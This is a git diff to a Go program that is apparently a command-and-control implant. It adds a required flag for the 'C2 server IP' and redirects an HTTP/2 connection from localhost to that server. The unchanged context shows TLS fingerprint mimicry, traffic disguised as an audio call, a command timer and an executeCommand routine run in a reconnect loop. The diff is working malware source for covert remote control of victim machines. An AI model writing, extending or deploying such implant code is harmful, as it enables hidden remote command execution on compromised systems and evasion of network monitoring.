@@ -14,16 +14,18 @@ import (
 	"os"
 	"context"
 	"math/rand"
+	"flag"
 
 	utls "github.com/refraction-networking/utls"
 	"golang.org/x/net/http2"
 )
 
 var	baseAudioTrack []byte
+var c2_server_ip string
 
 func dialH2()(*http2.ClientConn, error){
 
-	tcpConn, err := net.Dial("tcp", "127.0.0.1:443")
+	tcpConn, err := net.Dial("tcp", c2_server_ip+":443")
 	if err != nil {
 		fmt.Println("tcp dial:", err)
 		return nil, err
@@ -106,7 +108,7 @@ func startAudioCall(clientConn *http2.ClientConn){
 	var wg sync.WaitGroup
 
 	wg.Go(func(){ //watcher
-		defer fmt.Println("debug 1 done")
+		//defer fmt.Println("debug 1 done")
 		dataTimer := time.NewTimer(10* time.Second)
 		commandTimer := time.NewTimer(60* time.Second)
 		defer dataTimer.Stop()
@@ -140,7 +142,7 @@ func startAudioCall(clientConn *http2.ClientConn){
 
 	// write a chunk of bytes every 20ms via pw
 	wg.Go(func() {
-		defer fmt.Println("debug 2 done")
+		//defer fmt.Println("debug 2 done")
 		defer pw.Close() // closing pw sends EOF to server's r.Body
 		ticker := time.NewTicker(20 * time.Millisecond)
 		defer ticker.Stop()
@@ -168,7 +170,7 @@ func startAudioCall(clientConn *http2.ClientConn){
 
 	//read HELLO from server via resp.Body (blocks until server writes)
 	wg.Go(func() {
-		defer fmt.Println("debug 3 done")
+		//defer fmt.Println("debug 3 done")
 		defer resp.Body.Close()
 		buf := make([]byte, 1024)
 		for {
@@ -257,9 +259,21 @@ func executeCommand(finalCommand string){
 
 func main() {
 	
-	if echo_to_stdout=="true"{
+	target  := flag.String("target", "", "C2 server IP address (required)")
+	peet  := flag.String("peet", "flase", "test h2 akamai fingerprint with peet(true/false")
+	flag.Parse()
+
+	if *peet=="true"{
 		testFingerprint()
 	}
+
+	if *target == "" {
+		fmt.Println("Error: -target is required")
+		flag.Usage()
+		return
+	}
+	c2_server_ip= *target
+
 	for{
 
 		clientConn, err := dialH2()
